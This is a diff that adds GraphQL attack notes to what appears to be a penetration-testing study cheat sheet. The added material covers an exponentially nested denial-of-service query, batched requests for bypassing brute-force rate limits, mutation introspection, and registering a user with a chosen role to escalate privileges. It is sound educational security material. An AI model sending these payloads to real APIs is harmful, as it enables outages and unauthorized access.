@@ -215,3 +215,208 @@ Potential testing payload:
 ```
 <script>alert(1)</script>
 ```
+
+# Denial-of-Service (DoS) & Batching Attacks
+Depending on the GraphQL API's configuration, we can create queries that result in exponentially large responses and require significant resources to process. 
+Example:
+If we identify a loop between two objects let's say the 'author' and the 'posts' fields, we can abuse this loop by constructing a query that queries the author of all posts. For each author, we then query the author of all posts again. If we repeat this many times, the result grows exponentially larger, potentially resulting in a DoS scenario.
+Since the posts object is a connection, we need to specify the edges and node fields to obtain a reference to the corresponding Post object. As an example, let us query the author of all posts. From there, we will query all posts by each author and then the author's username for each of these posts:
+```
+{
+  posts {
+    author {
+      posts {
+        edges {
+          node {
+            author {
+              username
+            }
+          }
+        }
+      }
+    }
+  }
+}
+```
+Making the query large:
+```
+{
+  posts {
+    author {
+      posts {
+        edges {
+          node {
+            author {
+              posts {
+                edges {
+                  node {
+                    author {
+                      posts {
+                        edges {
+                          node {
+                            author {
+                              posts {
+                                edges {
+                                  node {
+                                    author {
+                                      posts {
+                                        edges {
+                                          node {
+                                            author {
+                                              posts {
+                                                edges {
+                                                  node {
+                                                    author {
+                                                      posts {
+                                                        edges {
+                                                          node {
+                                                            author {
+                                                              posts {
+                                                                edges {
+                                                                  node {
+                                                                    author {
+                                                                      username
+                                                                    }
+                                                                  }
+                                                                }
+                                                              }
+                                                            }
+                                                          }
+                                                        }
+                                                      }
+                                                    }
+                                                  }
+                                                }
+                                              }
+                                            }
+                                          }
+                                        }
+                                      }
+                                    }
+                                  }
+                                }
+                              }
+                            }
+                          }
+                        }
+                      }
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+```
+## Batching Attacks
+
+Batching in GraphQL refers to executing multiple queries with a single request.
+
+Example:
+Query the ID of the user admin and the title of the first post in a single request:
+```
+POST /graphql HTTP/1.1
+Host: 172.17.0.2
+Content-Length: 86
+Content-Type: application/json
+
+[
+	{
+		"query":"{user(username: \"admin\") {uuid}}"
+	},
+	{
+		"query":"{post(id: 1) {title}}"
+	}
+]
+```
+It can potentially be used to conduct brute-force attacks with significantly fewer HTTP requests. This could lead to bypasses of security measures in place to prevent brute-force attacks, such as rate limits.
+
+# Mutations
+Introspection query to identify all mutations supported by the backend and their arguments:
+```
+query {
+  __schema {
+    mutationType {
+      name
+      fields {
+        name
+        args {
+          name
+          defaultValue
+          type {
+            ...TypeRef
+          }
+        }
+      }
+    }
+  }
+}
+
+fragment TypeRef on __Type {
+  kind
+  name
+  ofType {
+    kind
+    name
+    ofType {
+      kind
+      name
+      ofType {
+        kind
+        name
+        ofType {
+          kind
+          name
+          ofType {
+            kind
+            name
+            ofType {
+              kind
+              name
+              ofType {
+                kind
+                name
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+```
+Let's say we can identify the 'registerUser' mutation in the result and the mutation requires a RegisterUserInput object as an input.
+Query all fields of the RegisterUserInput object:
+```
+{   
+  __type(name: "RegisterUserInput") {
+    name
+    inputFields {
+      name
+      description
+      defaultValue
+    }
+  }
+}
+```
+Following this example, from the result we can identify that we can provide the new user's username, password, role, and msg. As we identified earlier, we need to provide the password as an MD5-hash (`echo -n 'password' | md5sum`).
+Register a new user:
+```
+mutation {
+  registerUser(input: {username: "vautia", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "user", msg: "newUser"}) {
+    user {
+      username
+      password
+      msg
+      role
+    }
+  }
+}
+```
+
+## Exploitation with Mutations
+To identify potential attack vectors through mutations, we need to thoroughly examine all supported mutations and their inputs. In the previous example, we can provide the role argument for newly registered users, which might enable us to create users with a different role than the default role, potentially allowing us to escalate privileges.
